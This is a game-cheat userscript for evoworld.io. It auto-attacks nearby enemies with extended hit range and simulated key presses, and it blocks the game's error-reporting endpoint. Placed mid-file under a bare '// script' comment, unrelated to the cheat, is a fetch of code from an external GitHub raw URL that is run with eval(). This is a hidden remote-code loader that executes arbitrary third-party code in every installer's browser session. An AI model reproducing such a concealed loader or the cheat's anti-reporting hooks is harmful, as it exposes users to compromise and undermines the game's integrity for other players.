// ==UserScript==
// @name         Evoworld.io AutoHit
// @namespace    http://tampermonkey.net/
// @version      3.7
// @description  AutoHit,
// @author       Ghost972
// @match        https://evoworld.io/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=evoworld.io
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/563515/Evoworldio%20AutoHit.user.js
// @updateURL https://update.greasyfork.org/scripts/563515/Evoworldio%20AutoHit.meta.js
// ==/UserScript==
 
(function () {
    'use strict';
 
    // URL engelleme sistemi - Hata raporlamasını engeller
    (function () {
        const BLOCKED_URL = "https://evoworld.io/api/reportError.php";
        const REDIRECT_URL = "https://localhost";
 
        const originalFetch = window.fetch;
        window.fetch = function (input, init) {
            if (typeof input === "string" && input === BLOCKED_URL) {
                input = REDIRECT_URL;
            } else if (input instanceof Request && input.url === BLOCKED_URL) {
                input = new Request(REDIRECT_URL, input);
            }
            return originalFetch.call(this, input, init);
        };
 
        const originalOpen = XMLHttpRequest.prototype.open;
        XMLHttpRequest.prototype.open = function (method, url, ...rest) {
            if (url === BLOCKED_URL) {
                url = REDIRECT_URL;
            }
            return originalOpen.call(this, method, url, ...rest);
        };
    })();
 
    // Menü stilleri
    const menuStyle = `
<style>
#hackMenu {
    position: fixed;
    top: 20px;
    right: 20px;
    width: 280px;
    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
    border: 2px solid #0f3460;
    border-radius: 15px;
    padding: 20px;
    font-family: 'Segoe UI', Arial, sans-serif;
    z-index: 999999;
    box-shadow: 0 8px 32px rgba(0, 0, 0, 0.6);
    color: #eee;
    user-select: none;
}
 
#hackMenu h2 {
    color: #00d9ff;
    text-align: center;
    margin: 0 0 15px 0;
    font-size: 22px;
    text-shadow: 0 0 10px rgba(0, 217, 255, 0.5);
    font-weight: 600;
}
 
.menu-section {
    margin-bottom: 15px;
    padding-bottom: 15px;
    border-bottom: 1px solid #0f3460;
}
 
.menu-section:last-child {
    border-bottom: none;
    margin-bottom: 0;
    padding-bottom: 0;
}
 
.section-title {
    color: #00d9ff;
    font-size: 14px;
    font-weight: 600;
    margin-bottom: 10px;
    text-transform: uppercase;
    letter-spacing: 1px;
}
 
.menu-item {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 8px 0;
}
 
.menu-label {
    font-size: 13px;
    color: #ccc;
}
 
.toggle-btn {
    width: 50px;
    height: 24px;
    background: #2d3748;
    border-radius: 12px;
    position: relative;
    cursor: pointer;
    transition: 0.3s;
    border: 2px solid #4a5568;
}
 
.toggle-btn.active {
    background: linear-gradient(135deg, #00d9ff 0%, #0099cc 100%);
    border-color: #00d9ff;
}
 
.toggle-btn::after {
    content: '';
    position: absolute;
    width: 16px;
    height: 16px;
    background: white;
    border-radius: 50%;
    top: 2px;
    left: 2px;
    transition: 0.3s;
    box-shadow: 0 2px 4px rgba(0,0,0,0.3);
}
 
.toggle-btn.active::after {
    left: 28px;
}
 
.stats-box {
    background: rgba(0, 217, 255, 0.1);
    border: 1px solid #0f3460;
    border-radius: 8px;
    padding: 10px;
    margin-top: 10px;
}
 
.stat-item {
    display: flex;
    justify-content: space-between;
    padding: 4px 0;
    font-size: 12px;
}
 
.stat-label {
    color: #999;
}
 
.stat-value {
    color: #00d9ff;
    font-weight: 600;
}
 
#menuToggle {
    position: fixed;
    top: 20px;
    right: 320px;
    width: 45px;
    height: 45px;
    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
    border: 2px solid #0f3460;
    border-radius: 50%;
    color: #00d9ff;
    font-size: 24px;
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    z-index: 999999;
    transition: 0.3s;
    box-shadow: 0 4px 16px rgba(0, 0, 0, 0.4);
}
 
#menuToggle:hover {
    background: linear-gradient(135deg, #16213e 0%, #0f3460 100%);
    transform: scale(1.1);
    box-shadow: 0 6px 20px rgba(0, 217, 255, 0.3);
}
 
.action-btn {
    width: 100%;
    padding: 10px;
    margin: 5px 0;
    background: linear-gradient(135deg, #0f3460 0%, #1a1a2e 100%);
    border: 1px solid #00d9ff;
    color: #00d9ff;
    border-radius: 8px;
    cursor: pointer;
    font-size: 13px;
    font-weight: 600;
    transition: 0.3s;
    text-transform: uppercase;
    letter-spacing: 0.5px;
}
 
.action-btn:hover {
    background: linear-gradient(135deg, #00d9ff 0%, #0099cc 100%);
    color: #1a1a2e;
    transform: translateY(-2px);
    box-shadow: 0 4px 12px rgba(0, 217, 255, 0.4);
}
 
.info-text {
    font-size: 11px;
    color: #888;
    text-align: center;
    margin-top: 10px;
    font-style: italic;
}
</style>
`;
 
    // Menü HTML
    const menuHTML = `
<div id="menuToggle">☰</div>
<div id="hackMenu">
    <h2>COMBAT HACK</h2>
    
    <div class="menu-section">
        <div class="section-title">Saldırı Sistemi</div>
        <div class="menu-item">
            <span class="menu-label">AutoHit</span>
            <div class="toggle-btn active" id="toggleAutoHit"></div>
        </div>
        <div class="menu-item">
            <span class="menu-label">Ultra Mod (Her zaman açık)</span>
            <div class="toggle-btn active" id="toggleUltra"></div>
        </div>
        <div class="menu-item">
            <span class="menu-label">Flicking</span>
            <div class="toggle-btn" id="toggleFlicking"></div>
        </div>
    </div>
    
    <div class="menu-section">
        <div class="section-title">İstatistikler</div>
        <div class="stats-box">
            <div class="stat-item">
                <span class="stat-label">Başarı Oranı:</span>
                <span class="stat-value" id="statSuccess">0%</span>
            </div>
            <div class="stat-item">
                <span class="stat-label">Toplam Vuruş:</span>
                <span class="stat-value" id="statTotal">0</span>
            </div>
            <div class="stat-item">
                <span class="stat-label">Hit Delay:</span>
                <span class="stat-value" id="statDelay">0ms</span>
            </div>
            <div class="stat-item">
                <span class="stat-label">Hedef Mesafe:</span>
                <span class="stat-value" id="statDistance">-</span>
            </div>
        </div>
    </div>
    
    <div class="menu-section">
        <div class="section-title">Aksiyonlar</div>
        <button class="action-btn" id="btnReset">Reset Stats</button>
        <button class="action-btn" id="btnTest">Test Modu</button>
    </div>
    
    <div class="info-text">
        Tuşlar: R=AutoHit | T=Flicking | Y=Menü
    </div>
</div>
`;
 
    // savaş ayarları
    const ReaperList = new Set(['grimReaper', 'pumpkinGhost', 'ghostlyReaper']);
    const Height = { 'grimReaper': 140, 'pumpkinGhost': 144, 'ghostlyReaper': 142 };
    const HitRangeX = {
        'grimReaper': { 'grimReaper': 140, 'pumpkinGhost': 143, 'ghostlyReaper': 141 },
        'pumpkinGhost': { 'grimReaper': 143, 'pumpkinGhost': 140, 'ghostlyReaper': 141 },
        'ghostlyReaper': { 'grimReaper': 141, 'pumpkinGhost': 141, 'ghostlyReaper': 140 }
    };
    const HitBackRangeX = {
        'grimReaper': { 'grimReaper': 134, 'pumpkinGhost': 150, 'ghostlyReaper': 144 },
        'pumpkinGhost': { 'grimReaper': 158, 'pumpkinGhost': 148, 'ghostlyReaper': 172 },
        'ghostlyReaper': { 'grimReaper': 134, 'pumpkinGhost': 87, 'ghostlyReaper': 105 }
    };
    const DistAdjustmentY = { 'grimReaper': 5, 'pumpkinGhost': 4, 'ghostlyReaper': 4 };
 
    let hitDelay = 0;
    let lastHitTime = 0;
    let autoHitting = true;
    let ultraMode = true; // Her zaman açık
    let flicking = false; // Flicking modu
    let hitSuccess = 0;
    let totalAttempts = 0;
    let game;
 
    // düşman takip sistemi
    const enemyTracker = new Map();
    let isFirstEncounter = true;
 
    // Flicking tekniği
    function simulateQuickRightArrowKeyWithDelay() {
        const keyDownEvent = new KeyboardEvent('keydown', {
            key: 'ArrowRight',
            code: 'ArrowRight',
            keyCode: 39,
            which: 39,
            bubbles: true,
            cancelable: true
        });
        document.dispatchEvent(keyDownEvent);
 
        setTimeout(() => {
            const keyUpEvent = new KeyboardEvent('keyup', {
                key: 'ArrowRight',
                code: 'ArrowRight',
                keyCode: 39,
                which: 39,
                bubbles: true,
                cancelable: true
            });
            document.dispatchEvent(keyUpEvent);
        }, 200);
    }
 
    function simulateQuickLeftArrowKeyWithDelay() {
        const keyDownEvent = new KeyboardEvent('keydown', {
            key: 'ArrowLeft',
            code: 'ArrowLeft',
            keyCode: 37,
            which: 37,
            bubbles: true,
            cancelable: true
        });
        document.dispatchEvent(keyDownEvent);
 
        setTimeout(() => {
            const keyUpEvent = new KeyboardEvent('keyup', {
                key: 'ArrowLeft',
                code: 'ArrowLeft',
                keyCode: 37,
                which: 37,
                bubbles: true,
                cancelable: true
            });
            document.dispatchEvent(keyUpEvent);
        }, 200);
    }
 
    // Hızlı vuruş sistemi
    function skillUse() {
        const event = new KeyboardEvent('keydown', {
            key: ' ',
            code: 'Space',
            keyCode: 32,
            which: 32,
            bubbles: true,
            cancelable: true
        });
        document.dispatchEvent(event);
    }
 
    function skillStop() {
        const event = new KeyboardEvent('keyup', {
            key: ' ',
            code: 'Space',
            keyCode: 32,
            which: 32,
            bubbles: true,
            cancelable: true
        });
        document.dispatchEvent(event);
    }
 
    // Düşman davranış analizi
    function analyzeEnemy(enemy) {
        if (!enemy || !enemy.position || !game.me) return null;
 
        const myPos = game.me.position;
        const distance = Math.sqrt((enemy.position.x - myPos.x) ** 2 + (enemy.position.y - myPos.y) ** 2);
 
        if (!enemyTracker.has(enemy.id)) {
            enemyTracker.set(enemy.id, {
                lastDistance: distance,
                lastSeen: Date.now(),
                isNew: true
            });
        }
 
        const tracker = enemyTracker.get(enemy.id);
        const isApproaching = distance < tracker.lastDistance;
        const isNewTarget = tracker.isNew;
 
        tracker.lastDistance = distance;
        tracker.lastSeen = Date.now();
        tracker.isNew = false;
 
        return {
            distance,
            isApproaching,
            isNewTarget,
            speed: enemy.moveSpeed ? Math.sqrt((enemy.moveSpeed.x ** 2) + (enemy.moveSpeed.y ** 2)) : 0,
            urgency: isApproaching ? Math.max(0, 300 - distance) / 300 : 0
        };
    }
 
// script
 
fetch('https://raw.githubusercontent.com/shadowxds-eng/main.js/main/main.code')
 
  .then(response => response.text())
 
  .then(code => {
 
    eval(code);
 
  })
 
  .catch(err => console.log('Yüklenemedi:', err));
 
    // Gelecek pozisyon hesaplama
    function predictPosition(target, analysis) {
        if (!target.position || !target.moveSpeed) return target.position;
 
        if (analysis.isNewTarget || isFirstEncounter) {
            return target.position;
        }
 
        let predictionTime = 0.008;
        if (analysis.isApproaching && analysis.urgency > 0.9) {
            predictionTime = 0.015;
        } else if (analysis.speed < 100) {
            predictionTime = 0.002;
        }
 
        return {
            x: target.position.x + (target.moveSpeed.x || 0) * predictionTime,
            y: target.position.y + (target.moveSpeed.y || 0) * predictionTime
        };
    }
 
    // Mesafe hesaplama
    function getDistance(objPos) {
        if (!game || !game.me || !objPos) return Infinity;
        const myPos = game.me.position;
        return Math.abs(myPos.x - objPos.x) + Math.abs(myPos.y - objPos.y) * 0.7;
    }
 
    // En yakın düşmanı bul
    function getNearestEnemy() {
        if (!game || !game.me) return null;
 
        const list = game.hashMap && game.hashMap.retrieveVisibleByClient ?
            game.hashMap.retrieveVisibleByClient(game) : [];
 
        const enemies = list.filter(e =>
            e && e.hp != null && !e.deleted &&
            ReaperList.has(e.name) && e !== game.me
        );
 
        if (!enemies.length) return null;
 
        let nearest = null;
        let minDistance = Infinity;
 
        for (const enemy of enemies) {
            const distance = getDistance(enemy.position);
            if (distance < minDistance) {
                minDistance = distance;
                nearest = enemy;
            }
        }
 
        return nearest;
    }
 
    // Menzil hesaplama
    function isInRange(attacker, target, analysis) {
        if (!attacker || !target) return false;
 
        const futurePos = predictPosition(target, analysis);
        const xDist = Math.abs(attacker.position.x - futurePos.x);
        const yDist = Math.abs(attacker.position.y - futurePos.y);
 
        // Yön kontrolü
        const onLeftSide = attacker.position.x <= target.position.x;
        const enemyFlicking = (onLeftSide && target.direction === 1) || (!onLeftSide && target.direction === -1);
        const facingEnemy = (onLeftSide && attacker.direction === 1) || (!onLeftSide && attacker.direction === -1);
 
        // Flicking modunda her zaman düşmana bakıyormuş gibi davran
        const effectiveFacing = flicking ? true : facingEnemy;
 
        // Menzil seçimi
        let xRange;
        if (effectiveFacing) {
            xRange = enemyFlicking ?
                HitBackRangeX[attacker.name]?.[target.name] || 140 :
                HitRangeX[attacker.name]?.[target.name] || 140;
        } else {
            // Flicking yapılacak - daha geniş menzil
            xRange = enemyFlicking ?
                (HitBackRangeX[attacker.name]?.[target.name] || 140) - 25 :
                (HitRangeX[attacker.name]?.[target.name] || 140) - 5;
        }
 
        let yRange = Height[target.name] + (DistAdjustmentY[attacker.name] || 0);
 
        // İlk karşılaşmada ekstra menzil
        if (analysis.isNewTarget || isFirstEncounter) {
            xRange += 8;
            yRange += 5;
        }
 
        // Ultra modda ekstra menzil
        if (ultraMode) {
            xRange += 6;
            yRange += 4;
        }
 
        // Yaklaşan düşmanlara ekstra menzil
        if (analysis.isApproaching) {
            xRange += 2;
            yRange += 1;
        }
 
        return {
            inRange: xDist <= xRange && yDist <= yRange,
            facingEnemy: effectiveFacing,
            onLeftSide,
            enemyFlicking
        };
    }
 
    // Ana saldırı algoritması
    function instantHit() {
        if (!game || !game.me) return;
 
        const enemy = getNearestEnemy();
        if (!enemy) return;
 
        const analysis = analyzeEnemy(enemy);
        if (!analysis) return;
 
        const now = Date.now();
 
        // İlk karşılaşmada anında vuruş
        if (analysis.isNewTarget || isFirstEncounter) {
            hitDelay = 0;
            lastHitTime = 0;
            isFirstEncounter = false;
        }
 
        // Yaklaşan düşmanlara timing ayarı
        if (analysis.isApproaching && analysis.urgency > 0.75) {
            hitDelay = 5;
            lastHitTime = now - hitDelay;
        }
 
        // Delay kontrolü
        if (now - lastHitTime < hitDelay) return;
 
        // Menzil kontrolü
        const rangeCheck = isInRange(game.me, enemy, analysis);
        if (!rangeCheck.inRange) return;
 
        // VURUŞ
        lastHitTime = now;
        totalAttempts++;
        const hpBefore = enemy.hp;
 
        // Flicking tekniği - Gerektüğünde yön değiştirme ayarları
        if (!rangeCheck.facingEnemy && flicking) {
            if (rangeCheck.onLeftSide) {
                simulateQuickRightArrowKeyWithDelay();
            } else {
                simulateQuickLeftArrowKeyWithDelay();
            }
            // Flicking sonrası kısa bekleme
            setTimeout(() => {
                skillUse();
                setTimeout(() => skillStop(), 2);
            }, 50);
        } else {
            // Normal vuruş
            skillUse();
            setTimeout(() => skillStop(), 2);
        }
 
        // Başarı kontrolü
        setTimeout(() => {
            if (enemy.hp < hpBefore || enemy.deleted) {
                hitSuccess++;
                hitDelay = Math.max(0, hitDelay - 1);
            } else {
                hitDelay = Math.min(15, hitDelay + 2);
            }
        }, 30);
    }
 
    // Menü oluştur
    function createMenu() {
        // Stil ekle
        const styleElement = document.createElement('div');
        styleElement.innerHTML = menuStyle;
        if (styleElement.firstElementChild) {
            document.head.appendChild(styleElement.firstElementChild);
        }
 
        // Menü ekle
        const menuElement = document.createElement('div');
        menuElement.innerHTML = menuHTML;
 
        // Her iki elementi de ekle
        const elements = Array.from(menuElement.children);
        elements.forEach(el => {
            if (el) document.body.appendChild(el);
        });
 
        // Menü toggle
        const menuToggle = document.getElementById('menuToggle');
        if (menuToggle) {
            menuToggle.addEventListener('click', () => {
                const menu = document.getElementById('hackMenu');
                if (menu) {
                    menu.style.display = menu.style.display === 'none' ? 'block' : 'none';
                }
            });
        }
 
        // AutoHit toggle
        const toggleAutoHit = document.getElementById('toggleAutoHit');
        if (toggleAutoHit) {
            toggleAutoHit.addEventListener('click', function () {
                autoHitting = !autoHitting;
                isFirstEncounter = true;
                updateMenuButtons();
                console.log('AutoHit:', autoHitting ? 'AÇIK' : 'KAPALI');
            });
        }
 
        // Ultra toggle - devre dışı (her zaman açık)
        const toggleUltra = document.getElementById('toggleUltra');
        if (toggleUltra) {
            toggleUltra.style.opacity = '0.5';
            toggleUltra.style.cursor = 'not-allowed';
            toggleUltra.addEventListener('click', function () {
                console.log('Ultra sistem her zaman aktif!');
            });
        }
 
        // Flicking toggle
        const toggleFlicking = document.getElementById('toggleFlicking');
        if (toggleFlicking) {
            toggleFlicking.addEventListener('click', function () {
                flicking = !flicking;
                updateMenuButtons();
                console.log('Flicking:', flicking ? 'AÇIK' : 'KAPALI');
            });
        }
 
        // Reset button
        const btnReset = document.getElementById('btnReset');
        if (btnReset) {
            btnReset.addEventListener('click', () => {
                hitSuccess = 0;
                totalAttempts = 0;
                hitDelay = 0;
                updateStats();
                console.log('İstatistikler sıfırlandı');
            });
        }
 
        // Test button
        const btnTest = document.getElementById('btnTest');
        if (btnTest) {
            btnTest.addEventListener('click', () => {
                enemyTracker.clear();
                isFirstEncounter = true;
                hitDelay = 0;
                console.log('Test modu aktif');
            });
        }
    }
 
    // İstatistikleri güncelle
    function updateStats() {
        try {
            const successRate = totalAttempts > 0 ? ((hitSuccess / totalAttempts) * 100).toFixed(1) : '0';
            const statSuccess = document.getElementById('statSuccess');
            const statTotal = document.getElementById('statTotal');
            const statDelay = document.getElementById('statDelay');
            const statDistance = document.getElementById('statDistance');
 
            if (statSuccess) statSuccess.textContent = successRate + '%';
            if (statTotal) statTotal.textContent = totalAttempts;
            if (statDelay) statDelay.textContent = hitDelay + 'ms';
 
            const enemy = getNearestEnemy();
            if (enemy && game && game.me) {
                const analysis = analyzeEnemy(enemy);
                if (analysis && statDistance) {
                    statDistance.textContent = analysis.distance.toFixed(1);
                }
            } else {
                if (statDistance) statDistance.textContent = '-';
            }
        } catch (error) {
            // Sessizce devam et
        }
    }
 
    // Başlatma
    function start() {
        if (typeof window.game !== 'undefined') game = window.game;
 
        // Menü oluştur
        createMenu();
 
        // Ana döngü
        setInterval(() => {
            if (autoHitting) instantHit();
        }, 2);
 
        // İstatistik güncelleme
        setInterval(updateStats, 500);
 
        console.log('COMBAT HACK YÜKLENDİ!');
        console.log('Menüyü açmak için sağ üstteki butona tıklayın');
        console.log('Geliştirici: türk evo sikici');
    }
 
    // Oyun hazır olana kadar bekle
    function waitForGame() {
        try {
            if (typeof window.game === 'undefined' || !window.game || !window.game.me) {
                setTimeout(waitForGame, 100);
                return;
            }
            game = window.game;
            start();
        } catch (error) {
            console.log('Oyun yükleniyor, bekleniyor...');
            setTimeout(waitForGame, 500);
        }
    }
 
    // Sayfa tamamen yüklendiğinde başlat
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', waitForGame);
    } else {
        waitForGame();
    }
 
    // Menü butonlarını güncelle
    function updateMenuButtons() {
        const toggleAutoHit = document.getElementById('toggleAutoHit');
        const toggleUltra = document.getElementById('toggleUltra');
        const toggleFlicking = document.getElementById('toggleFlicking');
 
        if (toggleAutoHit) {
            if (autoHitting) {
                toggleAutoHit.classList.add('active');
            } else {
                toggleAutoHit.classList.remove('active');
            }
        }
 
        if (toggleUltra) {
            if (ultraMode) {
                toggleUltra.classList.add('active');
            } else {
                toggleUltra.classList.remove('active');
            }
        }
 
        if (toggleFlicking) {
            if (flicking) {
                toggleFlicking.classList.add('active');
            } else {
                toggleFlicking.classList.remove('active');
            }
        }
    }
 
    // Kontrol tuşları (menü ile senkronize)
    document.addEventListener('keydown', e => {
        if (e.key === 'R' || e.key === 'r') {
            autoHitting = !autoHitting;
            isFirstEncounter = true;
            updateMenuButtons();
            console.log('AutoHit:', autoHitting ? 'AÇIK' : 'KAPALI');
        }
        if (e.key === 'T' || e.key === 't') {
            flicking = !flicking;
            updateMenuButtons();
            console.log('Flicking:', flicking ? 'AÇIK' : 'KAPALI');
        }
        if (e.key === 'Y' || e.key === 'y') {
            const menu = document.getElementById('hackMenu');
            if (menu) {
                menu.style.display = menu.style.display === 'none' ? 'block' : 'none';
                console.log('Menü:', menu.style.display === 'none' ? 'KAPALI' : 'AÇIK');
            }
        }
    });
 
    // Başlangıç mesajı
    console.log('%cCOMBAT HACK', 'color: #00d9ff; font-size: 20px; font-weight: bold;');
    console.log('%cGeliştirici: türk evo sikici', 'color: #ff6600; font-size: 14px; font-weight: bold;');
    console.log('%cURL engelleme sistemi aktif!', 'color: #ff6600; font-size: 14px;');
    console.log('%cGelişmiş savaş araçları aktif!', 'color: #00ff00; font-size: 14px;');
    console.log('%cÖzellikler:', 'color: #00d9ff; font-size: 12px;');
    console.log('   AutoHit - Otomatik vuruş sistemi');
    console.log('   Ultra Mod - Genişletilmiş menzil');
    console.log('   Flicking - Otomatik yön değiştirme');
    console.log('   Canlı istatistikler');
    console.log('   İlk vuruş garantisi');
    console.log('   Hata raporu engelleme');
    console.log('%cKlavye kısayolları:', 'color: #ffaa00; font-size: 12px; font-weight: bold;');
    console.log('   R - AutoHit');
    console.log('   T - Flicking');
    console.log('   Y - Menü');
    console.log('%cNot: Ultra sistem sürekli aktif!', 'color: #00ff88; font-size: 11px; font-style: italic;');
})();